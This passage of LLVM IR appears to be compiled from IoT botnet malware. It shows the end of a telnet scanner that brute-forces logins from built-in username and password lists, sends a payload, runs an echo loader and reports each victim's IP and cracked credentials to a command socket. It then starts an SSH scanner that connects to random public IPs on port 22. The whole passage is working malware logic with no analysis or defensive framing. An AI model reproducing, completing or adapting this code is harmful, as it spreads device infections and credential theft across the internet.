  store i16 0, i16* %396, align 16
  %496 = load i8*, i8** %394, align 8
  %497 = call i8* @strstr(i8* %496, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #15
  %498 = icmp eq i8* %497, null
  br i1 %498, label %503, label %499

; <label>:499:                                    ; preds = %495
  call void @llvm.memset.p0i8.i64(i8* %496, i8 0, i64 1024, i32 1, i1 false)
  %500 = load i32, i32* %392, align 16
  %501 = call i32 @sclose(i32 %500)
  store i8 0, i8* %35, align 8
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %502, align 1
  br label %726

; <label>:503:                                    ; preds = %495
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %496, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:504:                                    ; preds = %488
  %505 = load i32, i32* %392, align 16
  %506 = load i8*, i8** %394, align 8
  %507 = load i16, i16* %396, align 16
  %508 = zext i16 %507 to i32
  %509 = call i32 @readUntil(i32 %505, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %506, i32 1024, i32 %508)
  %510 = icmp eq i32 %509, 0
  br i1 %510, label %520, label %511

; <label>:511:                                    ; preds = %504
  store i32 0, i32* %385, align 4
  store i16 0, i16* %396, align 16
  %512 = load i8*, i8** %394, align 8
  %513 = call i8* @strstr(i8* %512, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #15
  %514 = icmp eq i8* %513, null
  br i1 %514, label %519, label %515

; <label>:515:                                    ; preds = %511
  call void @llvm.memset.p0i8.i64(i8* %512, i8 0, i64 1024, i32 1, i1 false)
  %516 = load i32, i32* %392, align 16
  %517 = call i32 @sclose(i32 %516)
  store i8 0, i8* %35, align 8
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %518, align 1
  br label %726

; <label>:519:                                    ; preds = %511
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %512, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:520:                                    ; preds = %504
  %521 = load i32, i32* %392, align 16
  %522 = load i8*, i8** %394, align 8
  %523 = load i16, i16* %396, align 16
  %524 = zext i16 %523 to i32
  %525 = call i32 @readUntil(i32 %521, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %522, i32 1024, i32 %524)
  %526 = icmp eq i32 %525, 0
  br i1 %526, label %536, label %527

; <label>:527:                                    ; preds = %520
  store i32 0, i32* %385, align 4
  store i16 0, i16* %396, align 16
  %528 = load i8*, i8** %394, align 8
  %529 = call i8* @strstr(i8* %528, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #15
  %530 = icmp eq i8* %529, null
  br i1 %530, label %535, label %531

; <label>:531:                                    ; preds = %527
  call void @llvm.memset.p0i8.i64(i8* %528, i8 0, i64 1024, i32 1, i1 false)
  %532 = load i32, i32* %392, align 16
  %533 = call i32 @sclose(i32 %532)
  store i8 0, i8* %35, align 8
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %534, align 1
  br label %726

; <label>:535:                                    ; preds = %527
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %528, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:536:                                    ; preds = %520
  %537 = load i32, i32* %392, align 16
  %538 = load i8*, i8** %394, align 8
  %539 = load i16, i16* %396, align 16
  %540 = zext i16 %539 to i32
  %541 = call i32 @readUntil(i32 %537, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %538, i32 1024, i32 %540)
  %542 = icmp eq i32 %541, 0
  br i1 %542, label %552, label %543

; <label>:543:                                    ; preds = %536
  store i32 0, i32* %385, align 4
  store i16 0, i16* %396, align 16
  %544 = load i8*, i8** %394, align 8
  %545 = call i8* @strstr(i8* %544, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #15
  %546 = icmp eq i8* %545, null
  br i1 %546, label %551, label %547

; <label>:547:                                    ; preds = %543
  call void @llvm.memset.p0i8.i64(i8* %544, i8 0, i64 1024, i32 1, i1 false)
  %548 = load i32, i32* %392, align 16
  %549 = call i32 @sclose(i32 %548)
  store i8 0, i8* %35, align 8
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 0, i8* %550, align 1
  br label %726

; <label>:551:                                    ; preds = %543
  store i8 7, i8* %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %544, i8 0, i64 1024, i32 1, i1 false)
  br label %726

; <label>:552:                                    ; preds = %536
  %553 = load i8*, i8** %394, align 8
  %554 = call i64 @strlen(i8* %553) #15
  %555 = trunc i64 %554 to i16
  store i16 %555, i16* %396, align 16
  %556 = load i32, i32* %385, align 4
  %557 = add i32 %556, 10
  %558 = zext i32 %557 to i64
  %559 = call i64 @time(i64* null) #3
  %560 = icmp slt i64 %558, %559
  br i1 %560, label %561, label %726

; <label>:561:                                    ; preds = %552
  %562 = load i32, i32* %392, align 16
  %563 = call i32 @sclose(i32 %562)
  store i8 0, i8* %35, align 8
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %564, align 1
  br label %726

; <label>:565:                                    ; preds = %.lr.ph
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %567 = load i32, i32* %566, align 16
  %568 = call i64 @send(i32 %567, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0), i64 4, i32 16384) #3
  %569 = icmp slt i64 %568, 0
  br i1 %569, label %570, label %574

; <label>:570:                                    ; preds = %565
  %571 = load i32, i32* %566, align 16
  %572 = call i32 @sclose(i32 %571)
  store i8 0, i8* %35, align 8
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %573, align 1
  br label %726

; <label>:574:                                    ; preds = %565
  store i8 8, i8* %35, align 8
  br label %726

; <label>:575:                                    ; preds = %.lr.ph
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %577 = load i32, i32* %576, align 16
  %578 = call i64 @send(i32 %577, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i64 0, i64 0), i64 7, i32 16384) #3
  %579 = icmp slt i64 %578, 0
  br i1 %579, label %580, label %584

; <label>:580:                                    ; preds = %575
  %581 = load i32, i32* %576, align 16
  %582 = call i32 @sclose(i32 %581)
  store i8 0, i8* %35, align 8
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %583, align 1
  br label %726

; <label>:584:                                    ; preds = %575
  store i8 9, i8* %35, align 8
  br label %726

; <label>:585:                                    ; preds = %.lr.ph
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %587 = load i32, i32* %586, align 16
  %588 = call i64 @send(i32 %587, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %589 = icmp slt i64 %588, 0
  br i1 %589, label %590, label %594

; <label>:590:                                    ; preds = %585
  %591 = load i32, i32* %586, align 16
  %592 = call i32 @sclose(i32 %591)
  store i8 0, i8* %35, align 8
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %593, align 1
  br label %726

; <label>:594:                                    ; preds = %585
  %595 = load i32, i32* @mainCommSock, align 4
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 1
  %597 = load i32, i32* %596, align 4
  %598 = call i8* @inet_ntoa(i32 %597) #3
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 4
  %600 = load i8, i8* %599, align 2
  %601 = zext i8 %600 to i64
  %602 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %601
  %603 = load i8*, i8** %602, align 8
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 5
  %605 = load i8, i8* %604, align 1
  %606 = zext i8 %605 to i64
  %607 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %606
  %608 = load i8*, i8** %607, align 8
  %609 = call i32 (i32, i8*, ...) @sockprintf(i32 %595, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %598, i8* %603, i8* %608)
  store i8 10, i8* %35, align 8
  br label %726

; <label>:610:                                    ; preds = %.lr.ph
  call void @echoLoader()
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %612 = load i32, i32* %611, align 16
  %613 = call i64 @send(i32 %612, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.75, i64 0, i64 0), i64 61, i32 16384) #3
  store i8 11, i8* %35, align 8
  br label %726

; <label>:614:                                    ; preds = %.lr.ph
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %616 = load i32, i32* %615, align 16
  %617 = call i64 @send(i32 %616, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.76, i64 0, i64 0), i64 49, i32 16384) #3
  %618 = icmp slt i64 %617, 0
  br i1 %618, label %619, label %623

; <label>:619:                                    ; preds = %614
  %620 = load i32, i32* %615, align 16
  %621 = call i32 @sclose(i32 %620)
  store i8 0, i8* %35, align 8
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %622, align 1
  br label %726

; <label>:623:                                    ; preds = %614
  store i8 12, i8* %35, align 8
  br label %624

; <label>:624:                                    ; preds = %623, %.lr.ph
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 6
  %626 = load i32, i32* %625, align 4
  %627 = icmp eq i32 %626, 0
  br i1 %627, label %628, label %631

; <label>:628:                                    ; preds = %624
  %629 = call i64 @time(i64* null) #3
  %630 = trunc i64 %629 to i32
  store i32 %630, i32* %625, align 4
  br label %631

; <label>:631:                                    ; preds = %628, %624
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 0, i32 0
  %633 = load i32, i32* %632, align 16
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 8
  %635 = load i8*, i8** %634, align 8
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 7
  %637 = load i16, i16* %636, align 16
  %638 = zext i16 %637 to i32
  %639 = call i32 @readUntil(i32 %633, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %635, i32 1024, i32 %638)
  %640 = icmp eq i32 %639, 0
  br i1 %640, label %659, label %641

; <label>:641:                                    ; preds = %631
  store i32 0, i32* %625, align 4
  store i16 0, i16* %636, align 16
  %642 = load i32, i32* %632, align 16
  %643 = call i64 @send(i32 %642, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %644 = load i32, i32* @mainCommSock, align 4
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 1
  %646 = load i32, i32* %645, align 4
  %647 = call i8* @inet_ntoa(i32 %646) #3
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 4
  %649 = load i8, i8* %648, align 2
  %650 = zext i8 %649 to i64
  %651 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %650
  %652 = load i8*, i8** %651, align 8
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 5
  %654 = load i8, i8* %653, align 1
  %655 = zext i8 %654 to i64
  %656 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %655
  %657 = load i8*, i8** %656, align 8
  %658 = call i32 (i32, i8*, ...) @sockprintf(i32 %644, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %647, i8* %652, i8* %657)
  br label %726

; <label>:659:                                    ; preds = %631
  %660 = load i32, i32* %632, align 16
  %661 = load i8*, i8** %634, align 8
  %662 = load i16, i16* %636, align 16
  %663 = zext i16 %662 to i32
  %664 = call i32 @readUntil(i32 %660, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %661, i32 1024, i32 %663)
  %665 = icmp eq i32 %664, 0
  br i1 %665, label %684, label %666

; <label>:666:                                    ; preds = %659
  store i32 0, i32* %625, align 4
  store i16 0, i16* %636, align 16
  %667 = load i32, i32* %632, align 16
  %668 = call i64 @send(i32 %667, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %669 = load i32, i32* @mainCommSock, align 4
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 1
  %671 = load i32, i32* %670, align 4
  %672 = call i8* @inet_ntoa(i32 %671) #3
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 4
  %674 = load i8, i8* %673, align 2
  %675 = zext i8 %674 to i64
  %676 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %675
  %677 = load i8*, i8** %676, align 8
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 5
  %679 = load i8, i8* %678, align 1
  %680 = zext i8 %679 to i64
  %681 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %680
  %682 = load i8*, i8** %681, align 8
  %683 = call i32 (i32, i8*, ...) @sockprintf(i32 %669, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %672, i8* %677, i8* %682)
  br label %726

; <label>:684:                                    ; preds = %659
  %685 = load i32, i32* %632, align 16
  %686 = load i8*, i8** %634, align 8
  %687 = load i16, i16* %636, align 16
  %688 = zext i16 %687 to i32
  %689 = call i32 @readUntil(i32 %685, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %686, i32 1024, i32 %688)
  %690 = icmp eq i32 %689, 0
  br i1 %690, label %713, label %691

; <label>:691:                                    ; preds = %684
  store i32 0, i32* %625, align 4
  store i16 0, i16* %636, align 16
  %692 = load i32, i32* %632, align 16
  %693 = call i64 @send(i32 %692, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %694 = load i32, i32* @mainCommSock, align 4
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 1
  %696 = load i32, i32* %695, align 4
  %697 = call i8* @inet_ntoa(i32 %696) #3
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 4
  %699 = load i8, i8* %698, align 2
  %700 = zext i8 %699 to i64
  %701 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %700
  %702 = load i8*, i8** %701, align 8
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 5
  %704 = load i8, i8* %703, align 1
  %705 = zext i8 %704 to i64
  %706 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %705
  %707 = load i8*, i8** %706, align 8
  %708 = call i32 (i32, i8*, ...) @sockprintf(i32 %694, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %697, i8* %702, i8* %707)
  %709 = load i8*, i8** %634, align 8
  call void @llvm.memset.p0i8.i64(i8* %709, i8 0, i64 1024, i32 1, i1 false)
  %710 = load i32, i32* %632, align 16
  %711 = call i32 @sclose(i32 %710)
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %712, align 1
  store i8 0, i8* %35, align 8
  br label %726

; <label>:713:                                    ; preds = %684
  %714 = load i8*, i8** %634, align 8
  %715 = call i64 @strlen(i8* %714) #15
  %716 = trunc i64 %715 to i16
  store i16 %716, i16* %636, align 16
  %717 = load i32, i32* %625, align 4
  %718 = add i32 %717, 10
  %719 = zext i32 %718 to i64
  %720 = call i64 @time(i64* null) #3
  %721 = icmp slt i64 %719, %720
  br i1 %721, label %722, label %726

; <label>:722:                                    ; preds = %713
  %723 = load i32, i32* %632, align 16
  %724 = call i32 @sclose(i32 %723)
  store i8 0, i8* %35, align 8
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %33, i32 3
  store i8 1, i8* %725, align 1
  br label %726

; <label>:726:                                    ; preds = %.lr.ph, %252, %383, %574, %584, %594, %610, %85, %82, %133, %127, %226, %217, %357, %349, %561, %552, %722, %713, %62, %691, %666, %641, %619, %590, %580, %570, %551, %547, %535, %531, %519, %515, %503, %499, %487, %483, %471, %467, %455, %451, %439, %435, %428, %416, %412, %405, %379, %373, %345, %338, %331, %324, %317, %310, %303, %296, %289, %281, %270, %248, %242, %216, %202, %188, %174, %160, %116, %61
  %727 = add nsw i32 %.1339, 1
  %728 = icmp slt i32 %727, %11
  %.mux = select i1 %728, i32 %727, i32 0
  br label %.lr.ph
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @SSHScanner() local_unnamed_addr #13 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %2 to %struct.timeval*
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca <2 x i64>, align 16
  %7 = tail call i32 @getdtablesize() #3
  %8 = sdiv i32 %7, 4
  %9 = mul nsw i32 %8, 3
  %10 = icmp slt i32 %9, 512
  %11 = select i1 %10, i32 %9, i32 512
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = tail call zeroext i16 @htons(i16 zeroext 22) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %16 = bitcast i8* %15 to i64*
  store i64 0, i64* %16, align 4
  %17 = zext i32 %11 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %11 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %7, 3
  br i1 %22, label %.lr.ph335.preheader, label %._crit_edge

.lr.ph335.preheader:                              ; preds = %0
  br label %.lr.ph335

.lr.ph335:                                        ; preds = %.lr.ph335.preheader, %.lr.ph335
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph335 ], [ 0, %.lr.ph335.preheader ]
  %23 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 3
  store i8 1, i8* %23, align 1
  %24 = tail call noalias i8* @malloc(i64 1024) #3
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 8
  store i8* %24, i8** %25, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %26 = icmp slt i64 %indvars.iv.next, %20
  br i1 %26, label %.lr.ph335, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph335
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  store <2 x i64> <i64 5, i64 0>, <2 x i64>* %6, align 16
  %27 = bitcast <2 x i64>* %6 to i8*
  %28 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %22, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %30 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %31 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %711, %.lr.ph.preheader
  %.1333 = phi i32 [ %.mux, %711 ], [ 0, %.lr.ph.preheader ]
  %32 = sext i32 %.1333 to i64
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 2
  %35 = load i8, i8* %34, align 8
  switch i8 %35, label %711 [
    i8 0, label %36
    i8 1, label %86
    i8 2, label %136
    i8 3, label %229
    i8 4, label %252
    i8 5, label %360
    i8 6, label %383
    i8 7, label %564
    i8 8, label %574
    i8 9, label %584
    i8 10, label %609
  ]

; <label>:36:                                     ; preds = %.lr.ph
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %38 = load i8*, i8** %37, align 8
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 1024, i32 1, i1 false)
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  %40 = load i8, i8* %39, align 1
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %48, label %42

; <label>:42:                                     ; preds = %36
  %43 = bitcast i8** %37 to i64*
  %44 = load i64, i64* %43, align 8
  %45 = bitcast %struct.telstate_t* %33 to i8*
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 32, i32 16, i1 false)
  store i64 %44, i64* %43, align 8
  %46 = call i32 @getRandomPublicIP()
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  store i32 %46, i32* %47, align 4
  br label %61

; <label>:48:                                     ; preds = %36
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 5
  %50 = load i8, i8* %49, align 1
  %51 = add i8 %50, 1
  store i8 %51, i8* %49, align 1
  %52 = icmp eq i8 %51, 13
  br i1 %52, label %53, label %._crit_edge336

._crit_edge336:                                   ; preds = %48
  %.phi.trans.insert = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %.pre = load i8, i8* %.phi.trans.insert, align 2
  br label %57

; <label>:53:                                     ; preds = %48
  store i8 0, i8* %49, align 1
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 4
  %55 = load i8, i8* %54, align 2
  %56 = add i8 %55, 1
  store i8 %56, i8* %54, align 2
  br label %57

; <label>:57:                                     ; preds = %._crit_edge336, %53
  %58 = phi i8 [ %.pre, %._crit_edge336 ], [ %56, %53 ]
  %59 = icmp eq i8 %58, 4
  br i1 %59, label %60, label %._crit_edge337

._crit_edge337:                                   ; preds = %57
  %.phi.trans.insert338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 1
  %.pre339 = load i32, i32* %.phi.trans.insert338, align 4
  br label %61

; <label>:60:                                     ; preds = %57
  store i8 1, i8* %39, align 1
  br label %711

; <label>:61:                                     ; preds = %._crit_edge337, %42
  %62 = phi i32 [ %.pre339, %._crit_edge337 ], [ %46, %42 ]
  store i16 2, i16* %12, align 4
  store i16 %13, i16* %14, align 2
  store i64 0, i64* %16, align 4
  store i32 %62, i32* %29, align 4
  %63 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  store i32 %63, i32* %64, align 16
  %65 = call i32 @setsockopt(i32 %63, i32 1, i32 20, i8* nonnull %27, i32 16) #3
  %66 = load i32, i32* %64, align 16
  %67 = call i32 @setsockopt(i32 %66, i32 1, i32 21, i8* nonnull %27, i32 16) #3
  %68 = load i32, i32* %64, align 16
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %711, label %70

; <label>:70:                                     ; preds = %61
  %71 = call i32 (i32, i32, ...) @fcntl(i32 %68, i32 3, i8* null) #3
  %72 = or i32 %71, 2048
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %68, i32 4, i32 %72) #3
  %74 = load i32, i32* %64, align 16
  %75 = call i32 @connect(i32 %74, %struct.sockaddr* nonnull %30, i32 16) #3
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %84

; <label>:77:                                     ; preds = %70
  %78 = tail call i32* @__errno_location() #18
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 115
  br i1 %80, label %84, label %81

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %64, align 16
  %83 = call i32 @sclose(i32 %82)
  store i8 1, i8* %39, align 1
  br label %711

; <label>:84:                                     ; preds = %77, %70
  store i8 1, i8* %34, align 8
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  store i32 0, i32* %85, align 4
  br label %711

; <label>:86:                                     ; preds = %.lr.ph
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
  %88 = load i32, i32* %87, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %93

; <label>:90:                                     ; preds = %86
  %91 = call i64 @time(i64* null) #3
  %92 = trunc i64 %91 to i32
  store i32 %92, i32* %87, align 4
  br label %93

; <label>:93:                                     ; preds = %86, %90
  %94 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %28) #3, !srcloc !20
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 0, i32 0
  %96 = load i32, i32* %95, align 16
  %97 = srem i32 %96, 64
  %98 = zext i32 %97 to i64
  %99 = shl i64 1, %98
  %100 = sdiv i32 %96, 64
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %101
  %103 = load i64, i64* %102, align 8
  %104 = or i64 %99, %103
  store i64 %104, i64* %102, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %2, align 16
  %105 = add nsw i32 %96, 1
  %106 = call i32 @select(i32 %105, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %106, label %126 [
    i32 1, label %107
    i32 -1, label %122
  ]

; <label>:107:                                    ; preds = %93
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %108 = load i32, i32* %95, align 16
  %109 = call i32 @getsockopt(i32 %108, i32 1, i32 4, i8* nonnull %31, i32* nonnull %3) #3
  %110 = load i32, i32* %4, align 4
  %111 = icmp eq i32 %110, 0
  %112 = load i32, i32* %95, align 16
  br i1 %111, label %115, label %113

; <label>:113:                                    ; preds = %107
  %114 = call i32 @sclose(i32 %112)
  br label %.sink.split

; <label>:115:                                    ; preds = %107
  %116 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 3, i8* null) #3
  %117 = and i32 %116, -2049
  %118 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 4, i32 %117) #3
  store i32 0, i32* %87, align 4
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 7
  store i16 0, i16* %119, align 16
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 8
  %121 = load i8*, i8** %120, align 8
  call void @llvm.memset.p0i8.i64(i8* %121, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %34, align 8
  br label %711

; <label>:122:                                    ; preds = %93
  %123 = load i32, i32* %95, align 16
  %124 = call i32 @sclose(i32 %123)
  br label %.sink.split

.sink.split:                                      ; preds = %113, %122
  store i8 0, i8* %34, align 8
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %125, align 1
  br label %126

; <label>:126:                                    ; preds = %93, %.sink.split
  %127 = load i32, i32* %87, align 4
  %128 = add i32 %127, 10
  %129 = zext i32 %128 to i64
  %130 = call i64 @time(i64* null) #3
  %131 = icmp slt i64 %129, %130
  br i1 %131, label %132, label %711

; <label>:132:                                    ; preds = %126
  %133 = load i32, i32* %95, align 16
  %134 = call i32 @sclose(i32 %133)
  store i8 0, i8* %34, align 8
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 3
  store i8 1, i8* %135, align 1
  br label %711

; <label>:136:                                    ; preds = %.lr.ph
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %32, i32 6
